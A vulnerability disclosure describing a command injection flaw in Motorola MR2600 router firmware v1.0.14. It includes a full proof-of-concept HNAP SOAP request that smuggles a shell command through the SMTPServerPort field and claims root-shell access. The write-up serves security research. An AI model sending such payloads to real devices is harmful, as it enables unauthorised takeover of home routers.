# Motorala MR2600 MR2600-v1.0.14.img Command injection vulnerability

## Overview

- Manufacturer's website information：https://www.motorola.com/
- Firmware download address ： https://www.motorolacable.com/support/MR2600/software/

## 1. Affected version

![image-20220522091248943](img/image-20220522091248943.png)

Figure 1 shows the latest firmware Ba of the router

## Vulnerability details

![image-20220522104341311](img/image-20220522104341311.png)

Program by getting SaveSysEmailParams/SMTPServerPort the value of the parameter, passed to v9

![image-20220522104359266](img/image-20220522104359266.png)

After check_command_inject_ch function, check the command injection, v9, we can use '| |' symbol to bypass

The program then uses the nvram_SAFE_set function to set SysLogMail_SMTPServerPort to v9

![image-20220522104423004](img/image-20220522104423004.png)

In the rc file, the program uses nvram_safe_GET to get the value of SysLogMail_SMTPServerPort and passes it to V12. Then it uses sprintf to format V12 into V33. Finally, it uses twSystem to execute v33. Command injection vulnerability exists

## Recurring vulnerabilities and POC

In order to reproduce the vulnerability, the following steps can be followed:

1. Use the fat simulation firmware MR2600-v1.0.14.img
2. Attack with the following POC attacks

```
POST /HNAP1/ HTTP/1.1
Host: 81.70.52.167:7018
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:98.0) Gecko/20100101 Firefox/98.0
Accept: text/xml
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: text/xml
SOAPACTION: "http://purenetworks.com/HNAP1/SetNetworkSettings"
HNAP_AUTH: 3C5A4B9EECED160285AAE8D34D8CBA43 1649125990491
Content-Length: 632
Origin: http://81.70.52.167:7018
Connection: close
Referer: http://81.70.52.167:7018/Network.html
Cookie: SESSION_ID=2:1556825615:2; uid=TFKV4ftJ

<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<SaveSysEmailParams xmlns="http://purenetworks.com/HNAP1/">
	<SMTPServerPort> % || ls > /tmp/456 || echo 1</SMTPServerPort>
</SaveSysEmailParams>
</soap:Body>
</soap:Envelope>
```

![image-20220405112133823](img/image-20220405112133823.png)

Figure 2 POC attack effect

Finally, you can write exp, which can achieve a very stable effect of obtaining the root shell

![image-20220522091701627](img/image-20220522091701627.png)